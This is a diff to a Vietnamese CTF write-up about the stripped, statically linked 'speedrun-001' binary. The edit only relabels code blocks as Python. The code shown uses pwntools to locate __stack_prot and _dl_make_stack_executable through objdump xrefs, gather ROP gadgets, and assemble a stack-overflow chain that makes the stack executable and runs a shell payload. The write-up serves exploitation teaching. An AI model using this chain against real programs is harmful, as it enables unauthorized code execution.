@@ -381,7 +381,7 @@ Cách này sài chung được cho nhiều bài **statically linked** vì payloa
 Quan trọng là bài này bị strip symbols vì vậy ta cần cách nào đó để tìm được các symbol cần thiết nhanh nhất có thể.
 Như đã đề cập ở writeup [sandbox kỳ tetctf](https://github.com/phieulang1993/ctf-writeups/tree/master/2019/tetctf.cf/sandbox) giờ mình sử dụng pwntools kết hợp với 1 số công cụ khác để tìm tự động:
 Trước hết ta tìm **__stack_prot**:
-```
+```python
 def find_stack_prot():
 	data_rel_ro = elf.get_section_by_name(".data.rel.ro").header
 	data_rel_ro_sh_addr = data_rel_ro.sh_addr
@@ -393,13 +393,13 @@ Y như trong writeup sandbox luôn nhé!
 
 Tiếp theo ta tìm **_dl_make_stack_executable**:
 Vì **_dl_make_stack_executable** có sử dụng tới **__stack_prot** nên ta cần tìm các hàm xref tới **__stack_prot** là có thể tìm được **_dl_make_stack_executable**
-```
+```python
 def find_dl_make_stack_executable(__stack_prot):
 	xref_result = xref(hex(__stack_prot)[2:])[1]
 	return int(xref_result.split(" ")[0],16)-32
 ```
 Để tìm xref thì ta làm sao? Mình học theo cách của [**peda**](https://github.com/longld/peda/blob/master/peda.py#L876) (cảm ơn anh longld) là sử dụng **objdump**
-```
+```python
 def xref(search):
 	data = os.popen('objdump -M intel -z --prefix-address -d "speedrun-001" | grep "%s"' % search).read().strip().splitlines()
 	return data
@@ -439,14 +439,14 @@ Từ vị trí sử dụng **__stack_prot** tới đầu hàm **_dl_make_stack_e
 
 Tiếp theo ta tìm **__libc_stack_end**:
 Từ vị trí đầu hàm **_dl_make_stack_executable** tới vị trí sử dụng **__libc_stack_end** là **0x47FD57 - 0x47FD40 = 23 bytes**
-```
+```python
 def find__libc_stack_end(_dl_make_stack_executable):
 	xref_result = xref(hex(_dl_make_stack_executable+23)[2:])[0].split("# ")[1]
 	return int(xref_result.split(" ")[0],16)
 ```
 Okay vậy ta đã tìm xong các symbols cần thiết.
 Tiếp theo ta tìm các gadget:
-```
+```python
 binname = './speedrun-001'
 elf = ELF(binname)
 rop = ROP(elf)
@@ -463,7 +463,7 @@ def find_gadget(gadget):
 Mình sử dụng hàm rop.find_gadget, nếu không có thì sử dụng elf.search.
 
 Đây là các gadget cần thiết:
-```
+```python
 pop_rax_rdx_rbx = find_gadget('pop rax ; pop rdx ; pop rbx ; ret')
 mov_dword_rdx_rax = find_gadget('mov dword ptr [rdx], eax ; ret')
 pop_rdi = find_gadget('pop rdi ; ret')
@@ -472,7 +472,7 @@ call_rsp = find_gadget('call rsp')
 
 Shellcode thì mình sử dụng shellcode [pwnlib.shellcraft.amd64.linux.sh()](http://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.sh)
 Việc tiếp theo là kết hợp các symbols, gadgets và shellcode lại với nhau để tạo thành rop phù hợp:
-```
+```python
 def exploit_stack_overflow_static_binary(buffsize):
 	pop_rax_rdx_rbx = find_gadget('pop rax ; pop rdx ; pop rbx ; ret')
 	mov_dword_rdx_rax = find_gadget('mov dword ptr [rdx], eax ; ret')
